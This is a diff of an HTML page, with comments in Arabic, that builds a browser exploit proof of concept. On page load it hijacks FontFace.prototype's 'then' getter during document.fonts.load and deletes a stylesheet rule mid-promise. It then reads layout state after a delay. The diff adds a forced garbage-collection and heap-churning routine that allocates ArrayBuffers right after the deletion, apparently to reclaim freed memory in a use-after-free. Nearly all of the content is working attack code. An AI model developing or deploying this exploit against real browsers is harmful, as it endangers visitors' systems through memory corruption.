@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>تحليل التوقيت التلقائي المستقر - تفادي OOM</title>
+    <title>تفكيك التوقيت المتقدم - إجبار تدوير الذاكرة</title>
     <style>
         body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
         #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
@@ -17,9 +17,7 @@
 </head>
 <body>
 
-    <h2>مراقبة التفعيل التلقائي المستقر (Post-Load Execution)</h2>
-    <p>يتم الآن الانتظار لاستقرار بيئة المستند قبل تفعيل كمين المقاطعة...</p>
-    
+    <h2>مراقبة تدوير الذاكرة التلقائي (Forced Heap Churning)</h2>
     <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المتصفح...</div>
 
     <script>
@@ -32,10 +30,18 @@
             consoleElement.scrollTop = consoleElement.scrollHeight;
         }
 
-        // دالة الفحص الأساسية
+        // دالة مخصصة لإغراق الذاكرة وإجبار المحرك على التنظيف
+        function gc() {
+            screenLog("جاري تنشيط ميكانيكية إغراق الذاكرة (Forced GC)...");
+            for (let i = 0; i < 200; i++) {
+                // إنشاء مصفوفات ضخمة بشكل متكرر لإجبار المحرك على التخلص من الكائنات المعلقة
+                let s = new ArrayBuffer(0x10000); 
+            }
+        }
+
         function startExploitAnalysis() {
             consoleElement.innerHTML = ""; 
-            screenLog("بدء تشغيل الثغرة بعد استقرار بيئة الـ Userland...");
+            screenLog("بدء تشغيل الثغرة تلقائياً...");
 
             try {
                 let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
@@ -44,38 +50,34 @@
 
                 let fired = false;
 
-                // إعداد كمين التداخل مع الإغلاق الصارم للـ Promise لمنع تكرار المكدس
                 Object.defineProperty(FontFace.prototype, 'then', {
                     configurable: true,
                     get() {
                         if (!fired && this === A) {
                             fired = true;
-                            screenLog("!! تم تفعيل الكمين المنطقي بنجاح !!", true);
-                            
-                            new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-                            new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                            screenLog("!! تم تفعيل الكمين المنطقي !!", true);
                             
                             try {
                                 document.getElementById('s').sheet.deleteRule(0);
-                                screenLog("تم إرسال أمر حذف القاعدة التنسيقية.");
-                            } catch(e) { 
-                                screenLog("خطأ أثناء الحذف: " + e.message, true); 
-                            }
+                                screenLog("تم حذف القاعدة التنسيقية.");
+                            } catch(e) { screenLog("خطأ أثناء الحذف: " + e.message, true); }
                             
-                            // قراءة الـ Offset بعد تأخير بسيط لمعاينة استجابة الذاكرة
+                            // إطلاق الإغراق فوراً بعد الحذف للتأثير على الكائن المعلق
+                            gc();
+
+                            // قراءة الـ Offset المؤجلة لمعاينة السلوك
                             setTimeout(() => {
                                 screenLog("محاولة القراءة المؤجلة (offsetTop)...");
                                 let offset = document.body.offsetTop;
                                 screenLog("قيمة الـ Offset المسترجعة: " + offset);
-                            }, 10);
+                            }, 20);
                         }
                         
-                        // إنهاء الـ Promise قانونياً لمنع حلقة الـ OOM اللانهائية
                         return function(resolve) { if (resolve) resolve(); };
                     }
                 });
 
-                screenLog("إطلاق طلب التحميل المباشر document.fonts.load...");
+                screenLog("إطلاق طلب التحميل document.fonts.load...");
                 document.fonts.load('1em x', 'AB');
 
             } catch (err) {
@@ -83,9 +85,8 @@
             }
         }
 
-        // الانتظار حتى تحميل الصفحة بالكامل، ثم إعطاء مهلة ثانية ونصف للاستقرار التام
         window.onload = () => {
-            screenLog("تم تحميل الصفحة. جاري الانتظار 1.5 ثانية لتفادي الـ OOM التلقائي...");
+            screenLog("تم تحميل الصفحة. الانتظار 1.5 ثانية للاستقرار المستند الفعلي...");
             setTimeout(startExploitAnalysis, 1500);
         };
 
